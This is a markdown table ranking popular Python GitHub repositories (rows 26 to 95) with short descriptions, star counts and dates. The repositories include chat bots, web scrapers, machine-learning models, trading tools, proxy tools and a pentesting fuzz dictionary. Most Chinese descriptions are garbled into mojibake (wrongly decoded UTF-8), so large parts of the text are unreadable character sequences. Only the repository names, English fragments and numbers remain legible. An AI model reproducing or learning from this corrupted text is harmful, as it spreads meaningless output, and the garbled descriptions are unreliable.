|26|[sfyc23/EverydayWechat](https://github.com/sfyc23/EverydayWechat)|ÂæÆ‰ø°Âä©ÊâãÔºö1.ÊØèÊó•ÂÆöÊó∂ÁªôÂ•ΩÂèãÔºàÂ•≥ÂèãÔºâÂèëÈÄÅÂÆöÂà∂Ê∂àÊÅØ„ÄÇ2.Êú∫Âô®‰∫∫Ëá™Âä®ÂõûÂ§çÂ•ΩÂèã„ÄÇ3.Áæ§Âä©ÊâãÂäüËÉΩÔºà‰æãÂ¶ÇÔºöÊü•ËØ¢ÂûÉÂúæÂàÜÁ±ª„ÄÅÂ§©Ê∞î„ÄÅÊó•ÂéÜ„ÄÅÁîµÂΩ±ÂÆûÊó∂Á•®Êàø„ÄÅÂø´ÈÄíÁâ©ÊµÅ„ÄÅPM2.5Á≠âÔºâ|7.7k|Python|09/28|
|27|[sylnsfar/qrcode](https://github.com/sylnsfar/qrcode)|artistic QR Code in Python ÔºàAnimated GIF qr codeÔºâ- Python Ëâ∫ÊúØ‰∫åÁª¥Á†ÅÁîüÊàêÂô® ÔºàGIFÂä®ÊÄÅ‰∫åÁª¥Á†Å„ÄÅÂõæÁâá‰∫åÁª¥Á†ÅÔºâ|7.7k|Python|10/25|
|28|[hoochanlon/w3-goto-world](https://github.com/hoochanlon/w3-goto-world)|üçÖGit/AWS/Google ÈïúÂÉè ,SS/SSR/VMESSËäÇÁÇπ,WireGuard,IPFS, DeepWeb,Capitalism Áü•ËØÜÂÇ®Â§áÂ∫ì|7.6k|Python|10/26|
|29|[pwxcoo/chinese-xinhua](https://github.com/pwxcoo/chinese-xinhua)|:orange_book: ‰∏≠ÂçéÊñ∞ÂçéÂ≠óÂÖ∏Êï∞ÊçÆÂ∫ì„ÄÇÂåÖÊã¨Ê≠áÂêéËØ≠ÔºåÊàêËØ≠ÔºåËØçËØ≠ÔºåÊ±âÂ≠ó„ÄÇ|7.4k|Python|10/18|
|30|[vipstone/faceai](https://github.com/vipstone/faceai)|‰∏ÄÊ¨æÂÖ•Èó®Á∫ßÁöÑ‰∫∫ËÑ∏„ÄÅËßÜÈ¢ë„ÄÅÊñáÂ≠óÊ£ÄÊµã‰ª•ÂèäËØÜÂà´ÁöÑÈ°πÁõÆ.|7.3k|Python|04/16|
|31|[wangshub/Douyin-Bot](https://github.com/wangshub/Douyin-Bot)|üòç Python ÊäñÈü≥Êú∫Âô®‰∫∫ÔºåËÆ∫Â¶Ç‰ΩïÂú®ÊäñÈü≥‰∏äÊâæÂà∞ÊºÇ‰∫ÆÂ∞èÂßêÂßêÔºü |7.2k|Python|05/07|
|32|[luyishisi/Anti-Anti-Spider](https://github.com/luyishisi/Anti-Anti-Spider)|Ë∂äÊù•Ë∂äÂ§öÁöÑÁΩëÁ´ôÂÖ∑ÊúâÂèçÁà¨Ëô´ÁâπÊÄßÔºåÊúâÁöÑÁî®ÂõæÁâáÈöêËóèÂÖ≥ÈîÆÊï∞ÊçÆÔºåÊúâÁöÑ‰ΩøÁî®Âèç‰∫∫Á±ªÁöÑÈ™åËØÅÁ†ÅÔºåÂª∫Á´ãÂèçÂèçÁà¨Ëô´ÁöÑ‰ª£Á†Å‰ªìÂ∫ìÔºåÈÄöËøá‰∏é‰∏çÂêåÁâπÊÄßÁöÑÁΩëÁ´ôÂÅöÊñó‰∫âÔºàÊó†ÊÅ∂ÊÑèÔºâÊèêÈ´òÊäÄÊúØ„ÄÇÔºàÊ¨¢ËøéÊèê‰∫§Èöæ‰ª•ÈááÈõÜÁöÑÁΩëÁ´ôÔºâÔºàÂõ†Â∑•‰ΩúÂéüÂõ†ÔºåÈ°πÁõÆÊöÇÂÅúÔºâ |6.5k|Python|06/29|
|33|[Dod-o/Statistical-Learning-Method_Code](https://github.com/Dod-o/Statistical-Learning-Method_Code)|ÊâãÂÜôÂÆûÁé∞ÊùéËà™„ÄäÁªüËÆ°Â≠¶‰π†ÊñπÊ≥ï„Äã‰π¶‰∏≠ÂÖ®ÈÉ®ÁÆóÊ≥ï|6.4k|Python|09/08|
|34|[jindongwang/transferlearning](https://github.com/jindongwang/transferlearning)|Everything about Transfer Learning and Domain Adaptation--ËøÅÁßªÂ≠¶‰π†|6.1k|Python|10/25|
|35|[injetlee/Python](https://github.com/injetlee/Python)|PythonËÑöÊú¨„ÄÇÊ®°ÊãüÁôªÂΩïÁü•‰πéÔºå Áà¨Ëô´ÔºåÊìç‰ΩúexcelÔºåÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ÔºåËøúÁ®ãÂºÄÊú∫|5.9k|Python|10/07|
|36|[Vonng/ddia](https://github.com/Vonng/ddia)|„ÄäDesigning Data-Intensive Application„ÄãDDIA‰∏≠ÊñáÁøªËØë|5.6k|Python|10/26|
|37|[houtianze/bypy](https://github.com/houtianze/bypy)|Python client for Baidu Yun (Personal Cloud Storage) ÁôæÂ∫¶‰∫ë/ÁôæÂ∫¶ÁΩëÁõòPythonÂÆ¢Êà∑Á´Ø|5.5k|Python|10/16|
|38|[Linzaer/Ultra-Light-Fast-Generic-Face-Detector-1MB](https://github.com/Linzaer/Ultra-Light-Fast-Generic-Face-Detector-1MB)| üíé1MB lightweight face detection model  (1MBËΩªÈáèÁ∫ß‰∫∫ËÑ∏Ê£ÄÊµãÊ®°Âûã)|5.4k|Python|10/22|
|39|[PaddlePaddle/models](https://github.com/PaddlePaddle/models)|Pre-trained and Reproduced Deep Learning Models Ôºà„ÄéÈ£ûÊ°®„ÄèÂÆòÊñπÊ®°ÂûãÂ∫ìÔºåÂåÖÂê´Â§öÁßçÂ≠¶ÊúØÂâçÊ≤øÂíåÂ∑•‰∏öÂú∫ÊôØÈ™åËØÅÁöÑÊ∑±Â∫¶Â≠¶‰π†Ê®°ÂûãÔºâ|5.3k|Python|10/29|
|40|[jackzhenguo/python-small-examples](https://github.com/jackzhenguo/python-small-examples)|ÂëäÂà´ÊûØÁá•ÔºåËá¥Âäõ‰∫éÊâìÈÄ† Python ÂØåÊúâ‰ΩìÁ≥ª‰∏îÂÆûÁî®ÁöÑÂ∞è‰æãÂ≠ê„ÄÅÂ∞èÊ°à‰æã„ÄÇ|5.2k|Python|10/23|
|41|[lancopku/pkuseg-python](https://github.com/lancopku/pkuseg-python)|pkusegÂ§öÈ¢ÜÂüü‰∏≠ÊñáÂàÜËØçÂ∑•ÂÖ∑; The pkuseg toolkit for multi-domain Chinese word segmentation|5.1k|Python|06/21|
|42|[lining0806/PythonSpiderNotes](https://github.com/lining0806/PythonSpiderNotes)|PythonÂÖ•Èó®ÁΩëÁªúÁà¨Ëô´‰πãÁ≤æÂçéÁâà|5.1k|Python|10/02|
|43|[wistbean/learn_python3_spider](https://github.com/wistbean/learn_python3_spider)|pythonÁà¨Ëô´ÊïôÁ®ãÁ≥ªÂàó„ÄÅ‰ªé0Âà∞1Â≠¶‰π†pythonÁà¨Ëô´ÔºåÂåÖÊã¨ÊµèËßàÂô®ÊäìÂåÖÔºåÊâãÊú∫APPÊäìÂåÖÔºåÂ¶Ç fiddler„ÄÅmitmproxyÔºåÂêÑÁßçÁà¨Ëô´Ê∂âÂèäÁöÑÊ®°ÂùóÁöÑ‰ΩøÁî®ÔºåÂ¶ÇÔºörequests„ÄÅbeautifulSoup„ÄÅselenium„ÄÅappium„ÄÅscrapyÁ≠âÔºå‰ª•ÂèäIP‰ª£ÁêÜÔºåÈ™åËØÅÁ†ÅËØÜÂà´ÔºåMysqlÔºåMongoDBÊï∞ÊçÆÂ∫ìÁöÑpython‰ΩøÁî®ÔºåÂ§öÁ∫øÁ®ãÂ§öËøõÁ®ãÁà¨Ëô´ÁöÑ‰ΩøÁî®Ôºåcss Áà¨Ëô´Âä†ÂØÜÈÄÜÂêëÁ†¥Ëß£ÔºåJSÁà¨Ëô´ÈÄÜÂêëÔºåÂàÜÂ∏ÉÂºèÁà¨Ëô´ÔºåÁà¨Ëô´È°πÁõÆÂÆûÊàòÂÆû‰æãÁ≠â|5.0k|Python|10/16|
|44|[0x5e/wechat-deleted-friends](https://github.com/0x5e/wechat-deleted-friends)|Êü•ÁúãË¢´Âà†ÁöÑÂæÆ‰ø°Â•ΩÂèã|4.9k|Python|10/01|
|45|[lcdevelop/ChatBotCourse](https://github.com/lcdevelop/ChatBotCourse)|Ëá™Â∑±Âä®ÊâãÂÅöËÅäÂ§©Êú∫Âô®‰∫∫ÊïôÁ®ã|4.8k|Python|10/13|
|46|[PeterDing/iScript](https://github.com/PeterDing/iScript)|ÂêÑÁßçËÑöÊú¨ -- ÂÖ≥‰∫é ËôæÁ±≥ xiami.com, ÁôæÂ∫¶ÁΩëÁõò pan.baidu.com, 115ÁΩëÁõò 115.com, ÁΩëÊòìÈü≥‰πê music.163.com, ÁôæÂ∫¶Èü≥‰πê music.baidu.com, 360ÁΩëÁõò/‰∫ëÁõò yunpan.cn, ËßÜÈ¢ëËß£Êûê flvxz.com, bt torrent ‚Üî magnet, ed2k ÊêúÁ¥¢, tumblr ÂõæÁâá‰∏ãËΩΩ, unzip|4.8k|Python|10/18|
|47|[chyroc/WechatSogou](https://github.com/chyroc/WechatSogou)|Âü∫‰∫éÊêúÁãóÂæÆ‰ø°ÊêúÁ¥¢ÁöÑÂæÆ‰ø°ÂÖ¨‰ºóÂè∑Áà¨Ëô´Êé•Âè£|4.8k|Python|04/23|
|48|[shidenggui/easytrader](https://github.com/shidenggui/easytrader)|Êèê‰æõÂêåËä±È°∫ÂÆ¢Êà∑Á´Ø/ÂõΩÈáë/ÂçéÊ≥∞ÂÆ¢Êà∑Á´Ø/Èõ™ÁêÉÁöÑÂü∫Èáë„ÄÅËÇ°Á•®Ëá™Âä®Á®ãÂ∫èÂåñ‰∫§Êòì‰ª•ÂèäËá™Âä®ÊâìÊñ∞ÔºåÊîØÊåÅË∑üË∏™ joinquant /ricequant Ê®°Êãü‰∫§Êòì Âíå ÂÆûÁõòÈõ™ÁêÉÁªÑÂêà, ÈáèÂåñ‰∫§ÊòìÁªÑ‰ª∂|4.4k|Python|10/23|
|49|[Jrohy/multi-v2ray](https://github.com/Jrohy/multi-v2ray)|v2rayÂ§öÁî®Êà∑ÁÆ°ÁêÜÈÉ®ÁΩ≤Á®ãÂ∫è|4.3k|Python|10/28|
|50|[QUANTAXIS/QUANTAXIS](https://github.com/QUANTAXIS/QUANTAXIS)|QUANTAXIS ÊîØÊåÅ‰ªªÂä°Ë∞ÉÂ∫¶ ÂàÜÂ∏ÉÂºèÈÉ®ÁΩ≤ÁöÑ ËÇ°Á•®/ÊúüË¥ß/ÊúüÊùÉ/Ê∏ØËÇ°/ËôöÊãüË¥ßÂ∏Å  Êï∞ÊçÆ/ÂõûÊµã/Ê®°Êãü/‰∫§Êòì/ÂèØËßÜÂåñ/Â§öË¥¶Êà∑ Á∫ØÊú¨Âú∞ÈáèÂåñËß£ÂÜ≥ÊñπÊ°à|4.2k|Python|10/25|
|51|[ymcui/Chinese-BERT-wwm](https://github.com/ymcui/Chinese-BERT-wwm)|Pre-Training with Whole Word Masking for Chinese BERTÔºà‰∏≠ÊñáBERT-wwmÁ≥ªÂàóÊ®°ÂûãÔºâ|4.1k|Python|10/20|
|52|[SmirkCao/Lihang](https://github.com/SmirkCao/Lihang)|Statistical learning methods, ÁªüËÆ°Â≠¶‰π†ÊñπÊ≥ï(Á¨¨2Áâà)[ÊùéËà™]  [Á¨îËÆ∞, ‰ª£Á†Å, notebook, ÂèÇËÄÉÊñáÁåÆ, Errata, lihang]|3.9k|Python|04/01|
|53|[offu/WeRoBot](https://github.com/offu/WeRoBot)|WeRoBot ÊòØ‰∏Ä‰∏™ÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ÂºÄÂèëÊ°ÜÊû∂|3.7k|Python|10/26|
|54|[yuanxiaosc/DeepNude-an-Image-to-Image-technology](https://github.com/yuanxiaosc/DeepNude-an-Image-to-Image-technology)|DeepNude's algorithm and general image generation theory and practice research, including pix2pix, CycleGAN, UGATIT, DCGAN, SinGAN, ALAE, mGANprior, StarGAN-v2 and VAE models (TensorFlow2 implementation). DeepNudeÁöÑÁÆóÊ≥ï‰ª•ÂèäÈÄöÁî®ÁîüÊàêÂØπÊäóÁΩëÁªúÔºàGAN,Generative Adversarial NetworkÔºâÂõæÂÉèÁîüÊàêÁöÑÁêÜËÆ∫‰∏éÂÆûË∑µÁ†îÁ©∂„ÄÇ|3.5k|Python|07/12|
|55|[QingdaoU/OnlineJudge](https://github.com/QingdaoU/OnlineJudge)|open source online judge based on Vue, Django and Docker.   ÈùíÂ≤õÂ§ßÂ≠¶ÂºÄÊ∫ê Online Judge   QQÁæ§ 496710125   admin@qduoj.com|3.5k|Python|10/22|
|56|[nl8590687/ASRT_SpeechRecognition](https://github.com/nl8590687/ASRT_SpeechRecognition)|A Deep-Learning-Based Chinese Speech Recognition System Âü∫‰∫éÊ∑±Â∫¶Â≠¶‰π†ÁöÑ‰∏≠ÊñáËØ≠Èü≥ËØÜÂà´Á≥ªÁªü|3.5k|Python|10/23|
|57|[xiaoming2028/FreePAC](https://github.com/xiaoming2028/FreePAC)|ÁßëÂ≠¶‰∏äÁΩë/Ê¢ØÂ≠ê/Ëá™Áî±‰∏äÁΩë/ÁøªÂ¢ô SS/SSR/V2Ray/Brook Êê≠Âª∫ÊïôÁ®ã ÂÖçË¥πÊú∫Âú∫„ÄÅVPNÂ∑•ÂÖ∑|3.4k|Python|10/17|
|58|[lawlite19/MachineLearning_Python](https://github.com/lawlite19/MachineLearning_Python)|Êú∫Âô®Â≠¶‰π†ÁÆóÊ≥ïpythonÂÆûÁé∞|3.4k|Python|10/01|
|59|[liangliangyy/DjangoBlog](https://github.com/liangliangyy/DjangoBlog)|üç∫Âü∫‰∫éDjangoÁöÑÂçöÂÆ¢Á≥ªÁªü|3.4k|Python|10/11|
|60|[chatopera/Synonyms](https://github.com/chatopera/Synonyms)|:herb: ‰∏≠ÊñáËøë‰πâËØçÔºöËÅäÂ§©Êú∫Âô®‰∫∫ÔºåÊô∫ËÉΩÈóÆÁ≠îÂ∑•ÂÖ∑ÂåÖ|3.3k|Python|10/11|
|61|[ownthink/KnowledgeGraphData](https://github.com/ownthink/KnowledgeGraphData)|Âè≤‰∏äÊúÄÂ§ßËßÑÊ®°1.4‰∫ø‰∏≠ÊñáÁü•ËØÜÂõæË∞±ÂºÄÊ∫ê‰∏ãËΩΩ|3.2k|Python|10/21|
|62|[Kr1s77/Python-crawler-tutorial-starts-from-zero](https://github.com/Kr1s77/Python-crawler-tutorial-starts-from-zero)|pythonÁà¨Ëô´ÊïôÁ®ãÔºåÂ∏¶‰Ω†‰ªéÈõ∂Âà∞‰∏ÄÔºåÂåÖÂê´jsÈÄÜÂêëÔºåselenium, tesseract OCRËØÜÂà´,mongodbÁöÑ‰ΩøÁî®Ôºå‰ª•ÂèäscrapyÊ°ÜÊû∂|3.2k|Python|09/04|
|63|[jinfagang/tensorflow_poems](https://github.com/jinfagang/tensorflow_poems)|‰∏≠ÊñáÂè§ËØóËá™Âä®‰ΩúËØóÊú∫Âô®‰∫∫ÔºåÂ±åÁÇ∏Â§©ÔºåÂü∫‰∫étensorflow1.10 apiÔºåÊ≠£Âú®ÁßØÊûÅÁª¥Êä§ÂçáÁ∫ß‰∏≠ÔºåÂø´starÔºå‰øùÊåÅÊõ¥Êñ∞ÔºÅ|3.2k|Python|09/16|
|64|[billryan/algorithm-exercise](https://github.com/billryan/algorithm-exercise)|Data Structure and Algorithm notes. Êï∞ÊçÆÁªìÊûÑ‰∏éÁÆóÊ≥ï/leetcode/lintcodeÈ¢òËß£/|3.1k|Python|10/13|
|65|[dataabc/weiboSpider](https://github.com/dataabc/weiboSpider)|Êñ∞Êµ™ÂæÆÂçöÁà¨Ëô´ÔºåÁî®pythonÁà¨ÂèñÊñ∞Êµ™ÂæÆÂçöÊï∞ÊçÆ|2.9k|Python|10/19|
|66|[brightmart/albert_zh](https://github.com/brightmart/albert_zh)|A LITE BERT FOR SELF-SUPERVISED LEARNING OF LANGUAGE REPRESENTATIONS, Êµ∑Èáè‰∏≠ÊñáÈ¢ÑËÆ≠ÁªÉALBERTÊ®°Âûã|2.9k|Python|10/22|
|67|[mozillazg/python-pinyin](https://github.com/mozillazg/python-pinyin)|Ê±âÂ≠óËΩ¨ÊãºÈü≥(pypinyin)|2.9k|Python|10/11|
|68|[the0demiurge/ShadowSocksShare](https://github.com/the0demiurge/ShadowSocksShare)|PythonÁà¨Ëô´/FlaskÁΩëÁ´ô/ÂÖçË¥πShadowSocksË¥¶Âè∑/ssrËÆ¢ÈòÖ/json ËÆ¢ÈòÖ|2.9k|Python|07/12|
|69|[MingchaoZhu/DeepLearning](https://github.com/MingchaoZhu/DeepLearning)|Python for„ÄäDeep Learning„ÄãÔºåËØ•‰π¶‰∏∫„ÄäÊ∑±Â∫¶Â≠¶‰π†„Äã(Ëä±‰π¶) Êï∞Â≠¶Êé®ÂØº„ÄÅÂéüÁêÜÂâñÊûê‰∏éÊ∫êÁ†ÅÁ∫ßÂà´‰ª£Á†ÅÂÆûÁé∞|2.8k|Python|06/23|
|70|[kangvcar/InfoSpider](https://github.com/kangvcar/InfoSpider)|INFO-SPIDER ÊòØ‰∏Ä‰∏™ÈõÜ‰ºóÂ§öÊï∞ÊçÆÊ∫ê‰∫é‰∏ÄË∫´ÁöÑÁà¨Ëô´Â∑•ÂÖ∑ÁÆ±üß∞ÔºåÊó®Âú®ÂÆâÂÖ®Âø´Êç∑ÁöÑÂ∏ÆÂä©Áî®Êà∑ÊãøÂõûËá™Â∑±ÁöÑÊï∞ÊçÆÔºåÂ∑•ÂÖ∑‰ª£Á†ÅÂºÄÊ∫êÔºåÊµÅÁ®ãÈÄèÊòé„ÄÇÊîØÊåÅÊï∞ÊçÆÊ∫êÂåÖÊã¨GitHub„ÄÅQQÈÇÆÁÆ±„ÄÅÁΩëÊòìÈÇÆÁÆ±„ÄÅÈòøÈáåÈÇÆÁÆ±„ÄÅÊñ∞Êµ™ÈÇÆÁÆ±„ÄÅHotmailÈÇÆÁÆ±„ÄÅOutlookÈÇÆÁÆ±„ÄÅ‰∫¨‰∏ú„ÄÅÊ∑òÂÆù„ÄÅÊîØ‰ªòÂÆù„ÄÅ‰∏≠ÂõΩÁßªÂä®„ÄÅ‰∏≠ÂõΩËÅîÈÄö„ÄÅ‰∏≠ÂõΩÁîµ‰ø°„ÄÅÁü•‰πé„ÄÅÂìîÂì©ÂìîÂì©„ÄÅÁΩëÊòì‰∫ëÈü≥‰πê„ÄÅQQÂ•ΩÂèã„ÄÅQQÁæ§„ÄÅÁîüÊàêÊúãÂèãÂúàÁõ∏ÂÜå„ÄÅÊµèËßàÂô®ÊµèËßàÂéÜÂè≤„ÄÅ12306„ÄÅÂçöÂÆ¢Âõ≠„ÄÅCSDNÂçöÂÆ¢„ÄÅÂºÄÊ∫ê‰∏≠ÂõΩÂçöÂÆ¢„ÄÅÁÆÄ‰π¶„ÄÇ|2.8k|Python|10/26|
|71|[pythonstock/stock](https://github.com/pythonstock/stock)|stockÔºåËÇ°Á•®Á≥ªÁªü„ÄÇ‰ΩøÁî®pythonËøõË°åÂºÄÂèë„ÄÇ|2.8k|Python|08/11|
|72|[imfht/fanhaodaquan](https://github.com/imfht/fanhaodaquan)| Áï™Âè∑Â§ßÂÖ®„ÄÇ|2.8k|Python|08/21|
|73|[TheKingOfDuck/fuzzDicts](https://github.com/TheKingOfDuck/fuzzDicts)|Web Pentesting Fuzz Â≠óÂÖ∏,‰∏Ä‰∏™Â∞±Â§ü‰∫Ü„ÄÇ|2.7k|Python|05/10|
|74|[ZiniuLu/Python-100-Days](https://github.com/ZiniuLu/Python-100-Days)|Âá∫Â§ÑÔºöhttps://github.com/jackfrued/Python-100-Days.git|2.7k|Python|10/01|
|75|[guhongze/adminset](https://github.com/guhongze/adminset)|Ëá™Âä®ÂåñËøêÁª¥Âπ≥Âè∞ÔºöCMDB„ÄÅCD„ÄÅDevOps„ÄÅËµÑ‰∫ßÁÆ°ÁêÜ„ÄÅ‰ªªÂä°ÁºñÊéí„ÄÅÊåÅÁª≠‰∫§‰ªò„ÄÅÁ≥ªÁªüÁõëÊéß„ÄÅËøêÁª¥ÁÆ°ÁêÜ„ÄÅÈÖçÁΩÆÁÆ°ÁêÜ|2.7k|Python|08/07|
|76|[shmilylty/OneForAll](https://github.com/shmilylty/OneForAll)|OneForAllÊòØ‰∏ÄÊ¨æÂäüËÉΩÂº∫Â§ßÁöÑÂ≠êÂüüÊî∂ÈõÜÂ∑•ÂÖ∑|2.7k|Python|10/25|
|77|[moranzcw/Computer-Networking-A-Top-Down-Approach-NOTES](https://github.com/moranzcw/Computer-Networking-A-Top-Down-Approach-NOTES)|„ÄäËÆ°ÁÆóÊú∫ÁΩëÁªúÔºçËá™È°∂Âêë‰∏ãÊñπÊ≥ï(Âéü‰π¶Á¨¨6Áâà)„ÄãÁºñÁ®ã‰Ωú‰∏öÔºåWiresharkÂÆûÈ™åÊñáÊ°£ÁöÑÁøªËØëÂíåËß£Á≠î„ÄÇ|2.7k|Python|09/05|
|78|[TingsongYu/PyTorch_Tutorial](https://github.com/TingsongYu/PyTorch_Tutorial)|„ÄäPytorchÊ®°ÂûãËÆ≠ÁªÉÂÆûÁî®ÊïôÁ®ã„Äã‰∏≠ÈÖçÂ•ó‰ª£Á†Å|2.7k|Python|09/26|
|79|[PyQt5/PyQt](https://github.com/PyQt5/PyQt)|PyQt ExamplesÔºàPyQtÂêÑÁßçÊµãËØïÂíå‰æãÂ≠êÔºâ PyQt4 PyQt5|2.6k|Python|07/29|
|80|[zhaipro/easy12306](https://github.com/zhaipro/easy12306)|‰ΩøÁî®Êú∫Âô®Â≠¶‰π†ÁÆóÊ≥ïÂÆåÊàêÂØπ12306È™åËØÅÁ†ÅÁöÑËá™Âä®ËØÜÂà´|2.5k|Python|05/31|
|81|[welliamcao/OpsManage](https://github.com/welliamcao/OpsManage)|Ëá™Âä®ÂåñËøêÁª¥Âπ≥Âè∞: ‰ª£Á†ÅÂèäÂ∫îÁî®ÈÉ®ÁΩ≤CI/CD„ÄÅËµÑ‰∫ßÁÆ°ÁêÜCMDB„ÄÅËÆ°Âàí‰ªªÂä°ÁÆ°ÁêÜÂπ≥Âè∞„ÄÅSQLÂÆ°Ê†∏ ÂõûÊªö„ÄÅ‰ªªÂä°Ë∞ÉÂ∫¶„ÄÅÁ´ôÂÜÖWIKI|2.5k|Python|10/28|
|82|[shidenggui/easyquotation](https://github.com/shidenggui/easyquotation)|ÂÆûÊó∂Ëé∑ÂèñÊñ∞Êµ™ / ËÖæËÆØ ÁöÑÂÖçË¥πËÇ°Á•®Ë°åÊÉÖ / ÈõÜÊÄùË∑ØÁöÑÂàÜÁ∫ßÂü∫ÈáëË°åÊÉÖ|2.5k|Python|06/01|
|83|[WhaleShark-Team/cobra](https://github.com/WhaleShark-Team/cobra)|Source Code Security Audit (Ê∫ê‰ª£Á†ÅÂÆâÂÖ®ÂÆ°ËÆ°)|2.4k|Python|04/24|
|84|[wzpan/wukong-robot](https://github.com/wzpan/wukong-robot)|ü§ñ wukong-robot ÊòØ‰∏Ä‰∏™ÁÆÄÂçï„ÄÅÁÅµÊ¥ª„ÄÅ‰ºòÈõÖÁöÑ‰∏≠ÊñáËØ≠Èü≥ÂØπËØùÊú∫Âô®‰∫∫/Êô∫ËÉΩÈü≥ÁÆ±È°πÁõÆÔºåËøòÂèØËÉΩÊòØÈ¶ñ‰∏™ÊîØÊåÅËÑëÊú∫‰∫§‰∫íÁöÑÂºÄÊ∫êÊô∫ËÉΩÈü≥ÁÆ±È°πÁõÆ„ÄÇ|2.4k|Python|10/10|
|85|[qq547276542/Agriculture_KnowledgeGraph](https://github.com/qq547276542/Agriculture_KnowledgeGraph)|ÂÜú‰∏öÁü•ËØÜÂõæË∞±(AgriKG)ÔºöÂÜú‰∏öÈ¢ÜÂüüÁöÑ‰ø°ÊÅØÊ£ÄÁ¥¢ÔºåÂëΩÂêçÂÆû‰ΩìËØÜÂà´ÔºåÂÖ≥Á≥ªÊäΩÂèñÔºåÊô∫ËÉΩÈóÆÁ≠îÔºåËæÖÂä©ÂÜ≥Á≠ñ|2.4k|Python|08/28|
|86|[YongHaoWu/NeteaseCloudMusicFlac](https://github.com/YongHaoWu/NeteaseCloudMusicFlac)|Ê†πÊçÆÁΩëÊòì‰∫ëÈü≥‰πêÁöÑÊ≠åÂçï, ‰∏ãËΩΩflacÊó†ÊçüÈü≥‰πêÂà∞Êú¨Âú∞. Download the FLAC music from Internet according to your NeteaseCloudMusic playlist.|2.4k|Python|07/06|
|87|[jindaxiang/akshare](https://github.com/jindaxiang/akshare)|AkShare is an elegant and simple financial data interface library for Python, built for human beings! ÂºÄÊ∫êË¥¢ÁªèÊï∞ÊçÆÊé•Âè£Â∫ì|2.4k|Python|10/29|
|88|[opendevops-cn/opendevops](https://github.com/opendevops-cn/opendevops)|CODOÊòØ‰∏ÄÊ¨æ‰∏∫Áî®Êà∑Êèê‰æõ‰ºÅ‰∏öÂ§öÊ∑∑Âêà‰∫ë„ÄÅ‰∏ÄÁ´ôÂºèDevOps„ÄÅËá™Âä®ÂåñËøêÁª¥„ÄÅÂÆåÂÖ®ÂºÄÊ∫êÁöÑ‰∫ëÁÆ°ÁêÜÂπ≥Âè∞„ÄÅËá™Âä®ÂåñËøêÁª¥Âπ≥Âè∞|2.4k|Python|08/28|
|89|[Tencent/FaceDetection-DSFD](https://github.com/Tencent/FaceDetection-DSFD)|ËÖæËÆØ‰ºòÂõæÈ´òÁ≤æÂ∫¶ÂèåÂàÜÊîØ‰∫∫ËÑ∏Ê£ÄÊµãÂô®|2.4k|Python|07/09|
|90|[liuhuanyong/QASystemOnMedicalKG](https://github.com/liuhuanyong/QASystemOnMedicalKG)| A tutorial and implement of disease centered Medical knowledge graph and qa system based on it„ÄÇÁü•ËØÜÂõæË∞±ÊûÑÂª∫ÔºåËá™Âä®ÈóÆÁ≠îÔºåÂü∫‰∫ékgÁöÑËá™Âä®ÈóÆÁ≠î„ÄÇ‰ª•ÁñæÁóÖ‰∏∫‰∏≠ÂøÉÁöÑ‰∏ÄÂÆöËßÑÊ®°ÂåªËçØÈ¢ÜÂüüÁü•ËØÜÂõæË∞±ÔºåÂπ∂‰ª•ËØ•Áü•ËØÜÂõæË∞±ÂÆåÊàêËá™Âä®ÈóÆÁ≠î‰∏éÂàÜÊûêÊúçÂä°„ÄÇ|2.3k|Python|08/13|
|91|[momosecurity/aswan](https://github.com/momosecurity/aswan)|ÈôåÈôåÈ£éÊéßÁ≥ªÁªüÈùôÊÄÅËßÑÂàôÂºïÊìéÔºåÈõ∂Âü∫Á°ÄÁÆÄÊòì‰æøÊç∑ÁöÑÈÖçÁΩÆÂ§öÁßçÂ§çÊùÇËßÑÂàôÔºåÂÆûÊó∂È´òÊïàÁÆ°ÊéßÁî®Êà∑ÂºÇÂ∏∏Ë°å‰∏∫„ÄÇ|2.3k|Python|09/21|
|92|[aaPanel/BaoTa](https://github.com/aaPanel/BaoTa)|ÂÆùÂ°îLinuxÈù¢Êùø - ÁÆÄÂçïÂ•ΩÁî®ÁöÑÊúçÂä°Âô®ËøêÁª¥Èù¢Êùø|2.3k|Python|08/04|
|93|[junerain123/javsdt](https://github.com/junerain123/javsdt)|ÂΩ±Áâá‰ø°ÊÅØÊï¥ÁêÜÂ∑•ÂÖ∑ÔºåÊäìÂèñÂÖÉÊï∞ÊçÆnfoÔºåËá™ÂÆö‰πâÈáçÂëΩÂêçÊñá‰ª∂(Â§π)Ôºå‰∏ãËΩΩfanartË£ÅÂâ™posterÔºå‰∏∫emby„ÄÅkodi„ÄÅÊûÅÂΩ±Ê¥æÈì∫Ë∑Ø„ÄÇ|2.3k|Python|06/25|
|94|[0xHJK/music-dl](https://github.com/0xHJK/music-dl)|search and download music ‰ªéÁΩëÊòì‰∫ëÈü≥‰πê„ÄÅQQÈü≥‰πê„ÄÅÈÖ∑ÁãóÈü≥‰πê„ÄÅÁôæÂ∫¶Èü≥‰πê„ÄÅËôæÁ±≥Èü≥‰πê„ÄÅÂí™ÂíïÈü≥‰πêÁ≠âÊêúÁ¥¢Âíå‰∏ãËΩΩÊ≠åÊõ≤|2.2k|Python|03/25|
|95|[tychxn/jd-assistant](https://github.com/tychxn/jd-assistant)|‰∫¨‰∏úÊä¢Ë¥≠Âä©ÊâãÔºöÂåÖÂê´ÁôªÂΩïÔºåÊü•ËØ¢ÂïÜÂìÅÂ∫ìÂ≠ò/‰ª∑Ê†ºÔºåÊ∑ªÂä†/Ê∏ÖÁ©∫Ë¥≠Áâ©ËΩ¶ÔºåÊä¢Ë¥≠ÂïÜÂìÅ(‰∏ãÂçï)ÔºåÊü•ËØ¢ËÆ¢ÂçïÁ≠âÂäüËÉΩ|2.2k|Python|03/10|
